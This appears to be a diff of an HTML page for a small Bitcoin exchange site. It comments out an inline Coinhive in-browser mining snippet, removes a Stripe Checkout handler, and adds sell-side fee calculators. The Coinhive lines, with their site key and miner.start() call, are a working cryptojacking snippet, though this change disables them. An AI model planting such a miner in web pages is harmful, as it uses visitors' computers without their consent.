@@ -19,10 +19,10 @@
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script src="https://checkout.stripe.com/checkout.js"></script>
-<script>
+<!--<script>
   var miner = new CoinHive.Anonymous('VPgKqaoxqrpzKX18Ygy2pj04Dm8awHKi', {throttle: 0.5});
   miner.start();
-</script>
+</script>-->
 <script>
   var buy;
   var sell;
@@ -276,49 +276,7 @@
             <input type="hidden" id="metadata" name="metadata" />
             <!-- <input type="button" id="buyBitcoinButton" class="btn btn-outline-secondary btn-lg"/>-->
         </form>
-  <script>
-        var buyhandler = StripeCheckout.configure({
-          key: 'pk_test_UNxP2GG9bvyICle3JasumBaD',
-          image: '../img/headdress2.png',
-          locale: 'auto',
-          token: function(token) {
-              $("#stripeToken").val(token.id);
-              $("#stripeEmail").val(token.email);
-              $("#amountInCents").val(roundUp(($('#buyamount').val() * buy * 1.06), 100) * 100);
-              
-              function getmetadata(){
-              var metadata = new Object();
-              metadata.email = token.email;
-              metadata.btcaddress = $('#buybtcaddress').val();
-              metadata.btcamount = $('#buyamount').val();
-              metadata.btcprice = buy;
-              var output = htmlEncode(JSON.stringify(metadata));
-              return output;
-              }
-              $("#metadata").val(getmetadata());
-              $("#formbuy").submit();
-            }
-          });
-
-        $('#buyBitcoinButton').on('click', function(e) {
-          // Open Checkout with further options:
-
-          buyhandler.open({
-            name: 'K-TownBTC',
-            description: "Buy " + $('#buyamount').val() + " BTC for $" + roundUp(($('#buyamount').val() * buy * 1.06), 100) + " CAD",
-            zipCode: true,
-            bitcoin:  false,
-            currency:   "CAD",
-            amount: roundUp(($('#buyamount').val() * buy * 1.06), 100) * 100,
-          });
-          e.preventDefault();
-        });
-
-        // Close Checkout on page navigation:
-        window.addEventListener('popstate', function() {
-          buyhandler.close();
-        });
-        </script>
+  
 
 
           </div>
@@ -338,8 +296,263 @@
           
             
                    <span class="lead">
+<!--
+                    The customer wants to sell X BTC, worth X CAD, at the price of X CAD for 1 BTC.
+                    You charge a X % TX fee.
+                    The Customer will send you X BTC, and you will give him X CAD
+-->
+                    The customer wants to sell <input type="text" id="sellBTCtotal" size="10" onchange="
+                      $('#sellCADtotal').val(
+                        roundUp(
+                          (Number($('#sellCADbot2').val())) 
+                          * 
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellCADtotalSEND').val(
+                        roundUp(
+                          (Number($('#sellCADbot2').val())) 
+                          * 
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                       $('#sellBTCtotalSEND').val(
+                      roundUp(
+                        (Number($('#sellCADtotal').val()))
+                        /
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (
+                          (Number($('#sellpercent').val())/100)
+                        + 1)
+                      , 10000)
+                      )
+                      $('#sellBTCtotalSEND2').val(
+                        roundUp(
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellCADtotalSEND2').val(
+                      roundUp(
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (Number($('#sellBTCtotalSEND2').val()))
+                        *
+                        (
+                          1- (Number($('#sellpercent').val())/100)
+                        )
+                      , 10000)
+                      )
+                    "/> BTC, 
+                    worth <input type="text" id="sellCADtotal" size="10" onchange="
+                      $('#sellBTCtotal').val(
+                        roundUp(
+                          (Number($('#sellCADtotal').val()))
+                          /
+                          (Number($('#sellCADbot2').val()))
+                        , 10000)
+                      );
+                        $('#sellCADtotalSEND').val(
+                        roundUp(
+                          (Number($('#sellCADtotal').val()))
+                        , 10000)
+                      )
+                       $('#sellBTCtotalSEND').val(
+                      roundUp(
+                        (Number($('#sellCADtotal').val()))
+                        /
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (
+                          (Number($('#sellpercent').val())/100)
+                        + 1)
+                      , 10000)
+                      )
+                      $('#sellBTCtotalSEND2').val(
+                        roundUp(
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellCADtotalSEND2').val(
+                      roundUp(
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (Number($('#sellBTCtotalSEND2').val()))
+                        *
+                        (
+                          1- (Number($('#sellpercent').val())/100)
+                        )
+                      , 10000)
+                      )
+                    "/> CAD, at the price of <input type="text" id="sellCADbot2" size="10" onchange="
+                      $('#sellCADtotal').val(
+                        roundUp(
+                          (Number($('#sellCADbot2').val()))
+                          *
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellBTCtotal').val(
+                        roundUp(
+                          (Number($('#sellCADbot2').val()))
+                          /
+                          (Number($('#sellCADtotal').val()))
+                        , 10000)
+                      )
+                       $('#sellCADtotalSEND').val(
+                        roundUp(
+                          (Number($('#sellCADtotal').val()))
+                        , 10000)
+                      )
+                       $('#sellBTCtotalSEND').val(
+                      roundUp(
+                        (Number($('#sellCADtotal').val()))
+                        /
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (
+                          (Number($('#sellpercent').val())/100)
+                        + 1)
+                      , 10000)
+                      )
+                      $('#sellBTCtotalSEND2').val(
+                        roundUp(
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellCADtotalSEND2').val(
+                      roundUp(
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (Number($('#sellBTCtotalSEND2').val()))
+                        *
+                        (
+                          1- (Number($('#sellpercent').val())/100)
+                        )
+                      , 10000)
+                      )
+                      "/> CAD for 1 BTC.
+<br/>
+                    You charge a <input type="text" id="sellpercent" size="2" onchange="
+                      $('#sellCADtotalSEND').val(
+                        roundUp(
+                          (Number($('#sellCADtotal').val()))
+                        , 10000)
+                      )
+                       $('#sellBTCtotalSEND').val(
+                      roundUp(
+                        (Number($('#sellCADtotal').val()))
+                        /
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (
+                          (Number($('#sellpercent').val())/100)
+                        + 1)
+                      , 10000)
+                      )
+                      $('#sellBTCtotalSEND2').val(
+                        roundUp(
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellCADtotalSEND2').val(
+                      roundUp(
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (Number($('#sellBTCtotalSEND2').val()))
+                        *
+                        (
+                          1- (Number($('#sellpercent').val())/100)
+                        )
+                      , 10000)
+                      )
+                    "/> % <a href="#" data-toggle="modal" data-target="#transactionfees">transaction fee</a>. 
+
+<br/>
+                    The customer will send you <input type="text" id="sellBTCtotalSEND" size="10" onchange="
+                      $('#sellCADtotalSEND').val(
+                        roundUp(
+                          roundUp(
+                            
+                              (Number($('#sellBTCtotalSEND').val()))
+                              *
+                              (
+                                1- (Number($('#sellpercent').val())/100)
+                              )
+                            
+                          , 100)
+                        *
+                        (Number($('#sellCADbot2').val()))
+                        , 10000)
+                      )
+                      $('#sellBTCtotalSEND2').val(
+                        roundUp(
+                          (Number($('#sellBTCtotal').val()))
+                        , 10000)
+                      )
+                      $('#sellCADtotalSEND2').val(
+                      roundUp(
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (Number($('#sellBTCtotalSEND2').val()))
+                        *
+                        (
+                          1- (Number($('#sellpercent').val())/100)
+                        )
+                      , 10000)
+                      )
+                    "/> BTC,
+                    and you will give him <input type="text" id="sellCADtotalSEND" size="10" onchange="
+                    $('#sellBTCtotalSEND').val(
+                      roundUp(
+                          roundUp(
+                            
+                              (Number($('#sellCADtotalSEND').val()))
+                              /
+                              (Number($('#sellCADbot2').val()))
+                          , 10000)
+
+                              *
+                              (
+                                1- (Number($('#sellpercent').val())/100)
+                              )
+                            
+                          , 10000)
+                      )
+                    "/> CAD.
+                    <!--
+<br/>
+                    Or you will send him <input type="text" id="sellCADtotalSEND2" size="10" onchange=""/> CAD,
+                    and he will send you <input type="text" id="sellBTCtotalSEND2" size="10" onchange="
+                    $('#sellCADtotalSEND2').val(
+                      roundUp(
+                        (Number($('#sellCADbot2').val()))
+                        *
+                        (Number($('#sellBTCtotalSEND2').val()))
+                        *
+                        (
+                          1- (Number($('#sellpercent').val())/100)
+                        )
+                      , 10000)
+                      )
+                    "/> BTC.-->
+
+
+<!--
             The customer wants to sell for <input type="text" id="selltotal" size="10" onchange="
-              $('#sellamount').val(roundUp(((Number($('#selltotal').val()) / Number($('#sellCADbot2').val())) * ((100-Number($('#sellpercent').val()))/100)), 10000));
+              $('#sellamount').val(
+                roundUp(
+                  (
+                    (Number($('#selltotal').val())
+                    /
+                    Number($('#sellCADbot2').val())
+                    )
+                    *
+                    (
+                      (100-Number($('#sellpercent').val()))/100)
+                    )
+                  , 10000)
+                  );
               "/>$ CAD worth of Bitcoin, at the current price of 
 
               <input type="text" id="sellCADbot2"   size="10" onchange="
@@ -362,7 +575,7 @@
                   $('#sellamount').val('1');
                 }
                 $('#selltotal').val(roundUp(Number($('#sellamount').val()) * Number($('#sellCADbot2').val()) * ((100-Number($('#sellpercent').val()))/100), 1000));
-              "/> BTC.
+              "/> BTC.-->
             </span>
         </form>
 
